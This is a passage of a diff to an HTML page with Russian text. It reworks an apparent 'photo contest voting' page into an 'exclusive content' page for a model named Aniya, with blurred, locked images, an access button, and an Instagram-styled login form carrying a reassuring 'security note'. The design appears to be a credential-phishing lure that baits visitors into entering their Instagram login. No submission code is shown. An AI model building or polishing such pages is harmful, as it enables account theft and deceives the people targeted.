@@ -3,17 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Фотоконкурс | Голосование</title>
+    <title>Aniya | Эксклюзивный контент</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
-            --primary: #FF6B6B;
-            --secondary: #4ECDC4;
-            --dark: #1A1A2E;
-            --light: #F1F1F1;
+            --primary: #8A2BE2;
+            --secondary: #FF69B4;
+            --dark: #0F0F0F;
+            --light: #F8F8F8;
             --accent: #FFD166;
-            --success: #06D6A0;
-            --error: #EF476F;
+            --success: #00CC66;
+            --error: #FF3333;
+            --card-bg: rgba(30, 30, 30, 0.7);
+            --text-secondary: #AAAAAA;
+            --instagram: #E4405F;
         }
 
         * {
@@ -24,7 +27,7 @@
         }
 
         body {
-            background: linear-gradient(135deg, var(--dark), #16213E);
+            background: linear-gradient(135deg, var(--dark), #1A1A2E);
             min-height: 100vh;
             color: var(--light);
             line-height: 1.6;
@@ -39,13 +42,14 @@
         .header {
             text-align: center;
             margin-bottom: 40px;
-            padding: 30px 0;
+            padding: 40px 0;
             position: relative;
             overflow: hidden;
-            border-radius: 15px;
+            border-radius: 20px;
             background: rgba(255, 255, 255, 0.05);
             backdrop-filter: blur(10px);
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
         }
 
         .header::before {
@@ -58,193 +62,225 @@
             background: linear-gradient(90deg, var(--primary), var(--secondary));
         }
 
-        .header h1 {
-            font-size: 2.8em;
+        .logo {
+            font-size: 3.5em;
+            font-weight: 800;
             margin-bottom: 15px;
             background: linear-gradient(90deg, var(--primary), var(--secondary));
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
             text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
+            letter-spacing: 1px;
         }
 
         .header p {
-            font-size: 1.1em;
+            font-size: 1.2em;
             opacity: 0.9;
             max-width: 700px;
             margin: 0 auto;
+            color: var(--text-secondary);
         }
 
-        .photo-container {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
-            gap: 30px;
+        .profile-section {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
             margin-bottom: 50px;
         }
 
-        .photo-card {
-            background: rgba(255, 255, 255, 0.08);
+        .profile-card {
+            background: var(--card-bg);
             border-radius: 20px;
-            padding: 20px;
-            transition: all 0.3s ease;
-            position: relative;
-            overflow: hidden;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
-        }
-
-        .photo-card:hover {
-            transform: translateY(-10px);
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
-            background: rgba(255, 255, 255, 0.12);
-        }
-
-        .photo-card::after {
-            content: '';
-            position: absolute;
-            bottom: 0;
-            left: 0;
+            padding: 30px;
             width: 100%;
-            height: 5px;
-            background: linear-gradient(90deg, var(--primary), var(--secondary));
-            transform: scaleX(0);
-            transform-origin: left;
-            transition: transform 0.3s ease;
+            max-width: 800px;
+            text-align: center;
+            margin-bottom: 30px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
         }
 
-        .photo-card:hover::after {
-            transform: scaleX(1);
-        }
-
-        .photo-placeholder {
-            background: linear-gradient(45deg, #2a2a2a, #1a1a1a);
-            height: 350px;
-            border-radius: 15px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-bottom: 20px;
-            position: relative;
+        .profile-image {
+            width: 150px;
+            height: 150px;
+            border-radius: 50%;
             overflow: hidden;
-            box-shadow: inset 0 0 20px rgba(0, 0, 0, 0.5);
+            margin: 0 auto 20px;
+            border: 3px solid var(--primary);
         }
 
-        .photo-placeholder img {
+        .profile-image img {
             width: 100%;
             height: 100%;
             object-fit: cover;
-            display: block;
-            position: absolute;
-            top: 0;
-            left: 0;
         }
 
-        .photo-placeholder::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: linear-gradient(
-                to bottom right,
-                rgba(255, 255, 255, 0) 0%,
-                rgba(255, 255, 255, 0.1) 50%,
-                rgba(255, 255, 255, 0) 100%
-            );
-            transform: rotate(30deg);
-            animation: shine 3s infinite;
+        .profile-name {
+            font-size: 2.5em;
+            font-weight: 700;
+            margin-bottom: 10px;
+            color: var(--light);
         }
 
-        @keyframes shine {
-            0% { transform: translateX(-100%) rotate(30deg); }
-            100% { transform: translateX(100%) rotate(30deg); }
-        }
-
-        .photo-number {
-            position: absolute;
-            top: 15px;
-            left: 15px;
-            background: rgba(0, 0, 0, 0.7);
-            color: white;
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: bold;
-            font-size: 1.2em;
-            z-index: 2;
-        }
-
-        .photo-info {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 15px;
-        }
-
-        .photo-title {
-            font-size: 1.3em;
-            font-weight: 600;
-        }
-
-        .vote-count {
+        .profile-bio {
             font-size: 1.1em;
-            background: rgba(255, 255, 255, 0.1);
-            padding: 5px 15px;
-            border-radius: 20px;
-            display: flex;
-            align-items: center;
+            color: var(--text-secondary);
+            margin-bottom: 20px;
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
         }
 
-        .vote-count i {
-            margin-right: 8px;
+        .stats {
+            display: flex;
+            justify-content: center;
+            gap: 40px;
+            margin-top: 20px;
+        }
+
+        .stat-item {
+            text-align: center;
+        }
+
+        .stat-value {
+            font-size: 1.8em;
+            font-weight: bold;
             color: var(--primary);
         }
 
-        .vote-btn {
-            background: linear-gradient(45deg, var(--primary), #FF8E8E);
+        .stat-label {
+            font-size: 0.9em;
+            color: var(--text-secondary);
+        }
+
+        .content-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 25px;
+            margin-bottom: 50px;
+        }
+
+        .content-card {
+            background: var(--card-bg);
+            border-radius: 15px;
+            overflow: hidden;
+            position: relative;
+            transition: all 0.3s ease;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2);
+        }
+
+        .content-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.3);
+        }
+
+        .content-image {
+            width: 100%;
+            height: 300px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .content-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            filter: blur(15px);
+            transition: filter 0.3s ease;
+        }
+
+        .content-card.unlocked .content-image img {
+            filter: blur(0);
+        }
+
+        .lock-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            opacity: 1;
+            transition: opacity 0.3s ease;
+        }
+
+        .content-card.unlocked .lock-overlay {
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .lock-icon {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            color: var(--primary);
+        }
+
+        .lock-text {
+            font-size: 1.1em;
+            font-weight: 600;
+        }
+
+        .content-info {
+            padding: 15px;
+        }
+
+        .content-title {
+            font-size: 1.2em;
+            font-weight: 600;
+            margin-bottom: 5px;
+        }
+
+        .content-date {
+            font-size: 0.9em;
+            color: var(--text-secondary);
+        }
+
+        .access-btn {
+            background: linear-gradient(45deg, var(--primary), var(--secondary));
             border: none;
-            padding: 12px 25px;
+            padding: 15px 30px;
             border-radius: 30px;
             color: white;
             font-weight: bold;
             cursor: pointer;
-            width: 100%;
             transition: all 0.3s ease;
-            display: flex;
-            align-items: center;
-            justify-content: center;
             font-size: 1.1em;
             letter-spacing: 0.5px;
             text-transform: uppercase;
-            box-shadow: 0 4px 15px rgba(239, 71, 111, 0.4);
+            box-shadow: 0 4px 15px rgba(138, 43, 226, 0.4);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 30px auto;
+            max-width: 300px;
         }
 
-        .vote-btn i {
+        .access-btn i {
             margin-right: 10px;
         }
 
-        .vote-btn:hover {
+        .access-btn:hover {
             transform: translateY(-3px);
-            box-shadow: 0 8px 20px rgba(239, 71, 111, 0.6);
+            box-shadow: 0 8px 20px rgba(138, 43, 226, 0.6);
         }
 
-        .vote-btn:active {
-            transform: translateY(1px);
-        }
-
+        /* Обновленный дизайн формы регистрации */
         .login-form {
-            background: rgba(26, 26, 46, 0.9);
+            background: rgba(26, 26, 46, 0.95);
             padding: 40px;
             border-radius: 20px;
-            max-width: 450px;
+            max-width: 500px;
             margin: 0 auto;
             backdrop-filter: blur(15px);
             border: 1px solid rgba(255, 255, 255, 0.1);
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
             position: relative;
             overflow: hidden;
         }
@@ -259,24 +295,27 @@
             background: linear-gradient(90deg, var(--primary), var(--secondary));
         }
 
-        .login-form h2 {
+        .login-header {
             text-align: center;
             margin-bottom: 30px;
-            font-size: 1.8em;
-            color: var(--light);
-            position: relative;
         }
 
-        .login-form h2::after {
-            content: '';
-            position: absolute;
-            bottom: -10px;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 80px;
-            height: 3px;
-            background: linear-gradient(90deg, var(--primary), var(--secondary));
-            border-radius: 3px;
+        .instagram-icon {
+            font-size: 3em;
+            color: var(--instagram);
+            margin-bottom: 15px;
+        }
+
+        .login-form h2 {
+            font-size: 1.8em;
+            color: var(--light);
+            margin-bottom: 10px;
+        }
+
+        .login-subtitle {
+            color: var(--text-secondary);
+            font-size: 1em;
+            margin-bottom: 20px;
         }
 
         .form-group {
@@ -285,11 +324,17 @@
         }
 
         .form-group label {
-            display: block;
+            display: flex;
+            align-items: center;
             margin-bottom: 10px;
             color: var(--light);
             font-weight: 500;
             font-size: 1.1em;
+        }
+
+        .form-group label i {
+            margin-right: 10px;
+            color: var(--instagram);
         }
 
         .form-group input {
@@ -308,15 +353,50 @@
             outline: none;
             background: rgba(255, 255, 255, 0.15);
             border-color: var(--primary);
-            box-shadow: 0 0 0 3px rgba(239, 71, 111, 0.2);
+            box-shadow: 0 0 0 3px rgba(138, 43, 226, 0.2);
         }
 
         .form-group input::placeholder {
             color: rgba(255, 255, 255, 0.5);
         }
 
+        .instagram-input-group {
+            display: flex;
+            align-items: center;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            padding-left: 15px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .instagram-prefix {
+            color: rgba(255, 255, 255, 0.7);
+            margin-right: 5px;
+        }
+
+        .security-note {
+            display: flex;
+            align-items: center;
+            background: rgba(0, 204, 102, 0.1);
+            border: 1px solid rgba(0, 204, 102, 0.3);
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+
+        .security-note i {
+            color: var(--success);
+            font-size: 1.5em;
+            margin-right: 15px;
+        }
+
+        .security-note p {
+            font-size: 0.9em;
+            color: var(--text-secondary);
+        }
+
         .submit-btn {
-            background: linear-gradient(45deg, var(--success), #06b890);
+            background: linear-gradient(45deg, var(--instagram), #C13584);
             border: none;
             padding: 15px 25px;
             border-radius: 30px;
@@ -329,7 +409,7 @@
             letter-spacing: 0.5px;
             text-transform: uppercase;
             margin-top: 10px;
-            box-shadow: 0 4px 15px rgba(6, 214, 160, 0.4);
+            box-shadow: 0 4px 15px rgba(228, 64, 95, 0.4);
             display: flex;
             align-items: center;
             justify-content: center;
@@ -341,41 +421,7 @@
 
         .submit-btn:hover {
             transform: translateY(-3px);
-            box-shadow: 0 8px 20px rgba(6, 214, 160, 0.6);
-        }
-
-        .submit-btn:active {
-            transform: translateY(1px);
-        }
-
-        .instagram-login {
-            text-align: center;
-            margin-top: 20px;
-        }
-
-        .instagram-btn {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            background: linear-gradient(45deg, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D);
-            color: white;
-            padding: 12px 25px;
-            border-radius: 30px;
-            text-decoration: none;
-            font-weight: bold;
-            transition: all 0.3s ease;
-            box-shadow: 0 4px 15px rgba(64, 93, 230, 0.4);
-            margin-top: 15px;
-        }
-
-        .instagram-btn i {
-            margin-right: 10px;
-            font-size: 1.2em;
-        }
-
-        .instagram-btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 8px 20px rgba(64, 93, 230, 0.6);
+            box-shadow: 0 8px 20px rgba(228, 64, 95, 0.6);
         }
 
         .modal {
@@ -437,76 +483,8 @@
             100% { transform: rotate(360deg); }
         }
 
-        .loading p {
-            margin-top: 10px;
-            font-size: 1.1em;
-        }
-
-        .debug-info {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background: rgba(0, 0, 0, 0.7);
-            padding: 15px;
-            border-radius: 10px;
-            font-family: monospace;
-            font-size: 0.9em;
-            max-width: 300px;
-            display: none;
-            z-index: 100;
-            border-left: 4px solid var(--accent);
-        }
-
-        .debug-toggle {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background: var(--dark);
-            color: white;
-            width: 50px;
-            height: 50px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
-            z-index: 101;
-            border: 2px solid var(--accent);
-        }
-
-        .debug-toggle i {
-            font-size: 1.5em;
-        }
-
-        .debug-info.active {
-            display: block;
-        }
-
-        .debug-entry {
-            margin-bottom: 8px;
-            padding-bottom: 8px;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
-        }
-
-        .debug-entry:last-child {
-            margin-bottom: 0;
-            padding-bottom: 0;
-            border-bottom: none;
-        }
-
-        .debug-timestamp {
-            color: var(--accent);
-            font-size: 0.8em;
-            margin-right: 5px;
-        }
-
-        .debug-message {
-            color: white;
-        }
-
         .success-message {
-            background: rgba(6, 214, 160, 0.2);
+            background: rgba(0, 204, 102, 0.2);
             border: 1px solid var(--success);
             color: var(--light);
             padding: 15px;
@@ -517,7 +495,7 @@
         }
 
         .error-message {
-            background: rgba(239, 71, 111, 0.2);
+            background: rgba(255, 51, 51, 0.2);
             border: 1px solid var(--error);
             color: var(--light);
             padding: 15px;
@@ -527,43 +505,35 @@
             display: none;
         }
 
-        .photo-description {
-            margin: 15px 0;
-            color: rgba(255, 255, 255, 0.8);
-            font-size: 0.95em;
-            line-height: 1.5;
-        }
-
-        .instagram-input-group {
-            display: flex;
-            align-items: center;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 10px;
-            padding-left: 15px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-        }
-
-        .instagram-prefix {
-            color: rgba(255, 255, 255, 0.7);
-            margin-right: 5px;
+        .footer {
+            text-align: center;
+            margin-top: 50px;
+            padding: 30px 0;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            color: var(--text-secondary);
+            font-size: 0.9em;
         }
 
         @media (max-width: 768px) {
-            .photo-container {
-                grid-template-columns: 1fr;
+            .content-grid {
+                grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
             }
 
-            .header h1 {
-                font-size: 2em;
-            }
-
-            .photo-card {
-                width: 100%;
+            .logo {
+                font-size: 2.5em;
             }
 
             .login-form {
                 padding: 30px 20px;
                 width: 90%;
+            }
+
+            .stats {
+                gap: 20px;
+            }
+
+            .stat-value {
+                font-size: 1.5em;
             }
         }
 
@@ -572,15 +542,19 @@
                 padding: 20px 0;
             }
 
-            .header h1 {
-                font-size: 1.8em;
+            .logo {
+                font-size: 2em;
             }
 
-            .photo-placeholder {
+            .profile-name {
+                font-size: 2em;
+            }
+
+            .content-image {
                 height: 250px;
             }
 
-            .vote-btn, .submit-btn {
+            .access-btn, .submit-btn {
                 padding: 12px 20px;
                 font-size: 1em;
             }
@@ -589,48 +563,64 @@
 </head>
 <body>
     <div class="container">
-        <header class="header animation">
-            <h1>Фотоконкурс 2025</h1>
-            <p>Проголосуйте за лучшую фотографию и получите шанс выиграть призы!</p>
+        <header class="header">
+            <h1 class="logo">Aniya</h1>
+            <p>Эксклюзивный контент только для подписчиков</p>
         </header>
 
-        <div class="photo-container">
-            <div class="photo-card animation">
-                <div class="photo-number">1</div>
-                <div class="photo-placeholder">
-                    <img src="data:image/jpeg;base64,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" alt="Фото 1">
+        <section class="profile-section">
+            <div class="profile-card">
+                <div class="profile-image">
+                    <img src="./img/ava.jpg" alt="Anissx">
                 </div>
-                <div class="photo-info">
-                    <div class="photo-title">Elafrils</div>
-                    <div class="vote-count"><i class="fas fa-heart"></i> <span id="votes1">42</span></div>
+                <h2 class="profile-name">Aniya</h2>
+                <p class="profile-bio">Фотомодель и создатель эксклюзивного контента. Подпишись, чтобы увидеть все мои фото и видео!</p>
+                
+                <div class="stats">
+                    <div class="stat-item">
+                        <div class="stat-value">127</div>
+                        <div class="stat-label">Фото</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-value">42</div>
+                        <div class="stat-label">Видео</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-value">5.2K</div>
